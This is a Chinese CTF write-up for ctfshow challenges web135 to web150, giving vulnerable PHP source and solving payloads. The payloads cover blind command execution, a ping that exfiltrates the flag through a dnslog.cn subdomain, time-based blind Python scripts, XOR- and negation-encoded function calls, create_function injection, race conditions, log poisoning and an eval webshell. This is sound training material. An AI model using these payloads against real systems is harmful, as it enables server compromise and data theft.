## web135(无回显rce，133plus)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
}
```

没有限制写的权限

payload：

```
F=`$F`;+nl f*>1.txt
```

访问1.txt

通过ping得到flag（未实现成功）

```
payload:F=`$F `;ping `awk '/flag/' flag.php`.1mlbcw.dnslog.cn
```

## web136(无回显rce)

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
```

利用tee命令写文件

payload：

```
ls | tee 1
ls / | tee 2
cat /f149_15_h3r3 | tee 3
```

##  web137(call_user_func)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

call_user_func($_POST['ctfshow']); 
```

直接调用类中的方法

```
ctfshow=ctfshow::getFlag
```

拓展

```
php中 ->与:: 调用类中的成员的区别
->用于动态语境处理某个类的某个实例
::可以调用一个静态的、不依赖于其他初始化的类方法.
```

## web138(call_user_func传入数组)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}
if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}
call_user_func($_POST['ctfshow']);
```

多过滤了冒号

call_user_func函数不仅可以传入字符串，还可以传入数组

```
call_user_func(array($classname,'getFlag'));
可以调用classname类中的getFlag方法
```

payload：

```
ctfshow[0]=ctfshow&ctfshow[1]=getFlag
```

## web139(136plus盲打)

```
源码与136一样，但是限制了写的权限，这时候可以考虑用盲打的方式
```

猜测文件名

```python
import requests
import time
import string

str = string.ascii_letters+string.digits+"_"
# print(str)
result=""
for i in range(1,5):
	key=0
	for j in range(1,15):
		if key=='1':
			break
		for n in str:
			payload="if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i,j,n)
			# print(payload)
			url="http://5aed66c4-83fa-4bb6-804d-ee0846827b8d.challenge.ctf.show/?c="+payload
			try:
				requests.get(url,timeout=(2.5,2.5))
			except:
			    result=result+n
			    print(result)
			    break
			if n=='_':
				key=1
	result+=" "
```

![image-20240117192329149](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20240117192329149.png)

猜测文件内容

```python
import requests
import time
import string


str = string.digits+string.ascii_lowercase+"-"
result=""
key=0
for j in range(1,45):
	# print(j)
	if key==1:
		break
	for n in str:
		payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n)
		#print(payload) 
		url="http://5aed66c4-83fa-4bb6-804d-ee0846827b8d.challenge.ctf.show/?c="+payload
		try:
			requests.get(url,timeout=(2.5,2.5))
		except:
		    result = result + n
		    print(result)
		    break
```

因为{}被过滤了，得到flag自己添加上去就行

拓展：

![image-20240117192830718](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20240117192830718.png)

## web140(intval，松散比较)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
} 
```

```
intval($code) == 'ctfshow'
intval会将非数字字符转换成0
如果该字符串以合法的数值开始，则使用该数值，否则其值为 0。0==0
我们让intval($code)为0就可以了
```

payload

```
f1=md5&f2=md5
f1=sha1&f2=sha1
f1=md5&f2=phpinfo
还有很多.......
```

## web141(数字和命令可以做运算)

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
} 
```

> if(preg_match('/^\W+$/', $v3)) 匹配所有非字符
>
> 在php里，数字是可以和命令进行一些运算的，例如 `1-phpinfo();`是可以执行phpinfo()命令的
>
> eval("1-phpinfo()-1;"); 也可以运行phpinfo函数



payload：

```
v1=1&v3=-(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)-&v2=1
取反前:system('cat f*')
```

## web142

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
} 
```

payload:

```
v1=0 //八进制
v1=0x0 //十六进制
```

## web143(无数字字母rce)

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

过滤了取反符号，可以进行异或

```
v1=1&v2=1&v3=/("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%0b%01%03%00%06%00"^"%7f%60%60%20%60%2a")/
```

## web144(无数字字母rce)

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

function check($str){
    return strlen($str)===1?true:false;
} 
```

同样，取反，异或

payload：

```
v1=1&v3=-&v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)
v1=1&v3=-&v2=("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%0b%01%03%00%06%00"^"%7f%60%60%20%60%2a")
```

## web145(巧用三目运算符，144plus)

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

加减乘除都被过滤了，可以利用三目运算符

```
eval("return 1?phpinfo():1;");
```

payload：

```
v1=1&v3=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):&v2=1
```

## web146(利用位运算符，145plus)

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
} 
```

payload

> 利用等号和位运算符 ||，|

```
v1=1&v2=1&v3===(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)||
v1=1&v2=1&v3=|(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5)|
```

## web147(create_function的利用)

```php
<?php
highlight_file(__FILE__);

if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }

}
```

> create_function函数的第一个参数是参数，第二个参数是内容
>
> 函数结构形似
>
> ```
> create_function('$a,$b','return 111')
> 
> ==>
> 
> function a($a, $b){
>     return 111;
> }
> ```
>
> 我们需要跳出函数定义
>
> ```
> create_function('$a,$b','return 111;}phpinfo();//')
> 
> ==>
> 
> function a($a, $b){
>     return 111;}phpinfo();//
> }
> ```

payload：

为什么是%5c(\\)？

> php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法

```
show=;};system('cat flag.php');//
ctf=%5ccreate_function
```

## web148(利用xor)

```php
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
        die("error");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}

function get_ctfshow_fl0g(){
    echo file_get_contents("flag.php");
}
```



payload:

```
没有过滤异或
code=("%08%02%08%09%05%0d"^"%7b%7b%7b%7d%60%60")("%09%01%03%01%06%02"^"%7d%60%60%21%60%28");
预期解
code=$哈="`{{{"^"?<>/";${$哈}[哼](${$哈}[嗯]);&哼=system&嗯=tac f*
```

## web149(条件竞争)

```php
<?php
$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}

file_put_contents($_GET['ctf'], $_POST['show']);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}
```

payload

```
非预期解，直接写入index.php
ctf=index.php
show=<?php eval($_POST[1]);?>
```



```
预期解，进行条件竞争
ctf=1.php
show=<?php system('tac /c*');?>
```

> 利用BP一直上传1.php
>
> 然后再开一个，一直访问1.php

## web150(日志包含)

```php
include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE){
    include($ctf);
}
```

> 这里有**extract($_GET);**
>
> 所以isVIP是可控的

payload

先往index.php里UA写入一句话

```
GET:isVIP=1
POST:ctf=/var/log/nginx/access.log&1=system('tac f*');
```

## web150plus(__autoload加载未定义的类)

```php
<?php
include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){
    include($ctf);
}
```



> class_exists — 查类是否已经定义
>
> __autoload — 尝试加载未定义的类
>
> ```
> 这个题一点点小坑__autoload()函数不是类里面的
> 最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦
> 原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用
> __autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo
> 接下来就去getshell啦
> ```

payload:

```
..CTFSHOW..=phpinfo
```

